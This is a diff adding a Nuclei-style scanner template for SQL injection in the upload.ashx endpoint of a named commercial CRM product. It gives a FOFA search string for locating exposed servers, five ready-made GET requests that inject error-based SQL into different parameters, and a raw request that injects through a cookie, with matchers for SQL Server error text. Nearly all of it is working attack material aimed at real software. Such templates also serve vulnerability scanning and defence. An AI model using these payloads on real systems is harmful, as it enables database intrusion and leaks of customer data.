@@ -1,0 +1,38 @@
+id: fumeng-cloud-crm-upload-multiple-sqli
+
+info:
+  name: "孚盟云CRM upload.ashx 接口多参数SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+          上海孚盟软件有限公司为外贸SaaS服务及行业解决方案提供商。其upload.ashx接口在多个请求参数处理中存在SQL语法注入缺陷，攻击者可通过构造恶意SQL查询实现数据库敏感信息泄露，并在具备高权限条件下执行任意代码或控制系统资源。
+          GET /Ajax/upload.ashx?action=showImgss&FID=1'and+1<@@version-- HTTP/1.1
+      GET /Ajax/upload.ashx?action=showSmallImg&id=1+and+1<@@version--&tabname=bfContacts&imgField=FID HTTP/1.1
+      GET /Ajax/upload.ashx?action=showProdImg&FID==1')+and+1<@@version-- HTTP/1.1
+      GET /Ajax/upload.ashx?action=image&CardID=1'and+1<@@version--&imagefb=FID HTTP/1.1
+      GET /Ajax/upload.ashx?action=DownLoadFieldAttch&trueFileName=1'and+1<@@version-- HTTP/1.1
+  tags: 孚盟云CRM
+
+http:
+- raw:
+  - |
+    GET /Ajax/upload.ashx?action=deletefile&name=poc HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: poc=1'and 1<@@version--
+  matchers-condition: and
+  matchers:
+    - type: status
+      status:
+        - 500
+    - type: word
+      part: body
+      words:
+        - "Microsoft SQL Server"
+        - "SqlException:"
+        - ".GetMblIsRepeat"
+    - type: regex
+      part: body
+      regex:
+        - "转换成数据类型(.*?)时失败"
+        - "在将(.*?)值"
